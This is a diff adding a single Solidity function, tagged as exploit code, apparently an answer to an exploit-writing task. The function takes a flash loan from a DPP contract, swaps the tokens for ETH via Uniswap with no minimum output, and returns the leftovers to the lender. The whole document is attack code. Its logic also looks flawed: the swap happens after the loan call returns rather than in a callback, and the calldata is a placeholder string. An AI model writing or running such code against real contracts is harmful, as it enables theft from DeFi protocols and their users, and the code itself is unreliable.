@@ -1,0 +1,27 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Step 1: Obtain token from DPP contract via flashloan
+    IDPP(target).flashLoan(amount, 0, address(this), "0x0");
+
+    // Step 2: Swap the obtained token for WETH
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken);
+    path[1] = uniswapRouter.WETH();
+    
+    IUniswapV2Router(uniswapRouter).swapExactTokensForETHSupportingFeeOnTransferTokens(
+        amount,  // Amount of valuableToken
+        0,        // Minimum amount of WETH to receive (set to 0 for simplicity)
+        path,
+        address(this), 
+        block.timestamp + 10 minutes
+    );
+
+    // Step 3: Transfer any remaining valuableToken back to the flashloan provider
+    uint256 remainingValuable = valuableToken.balanceOf(address(this));
+    if (remainingValuable > 0) {
+        valuableToken.transfer(flashloanProvider, remainingValuable);
+    }
+}
+</executeExploitCode>
+```
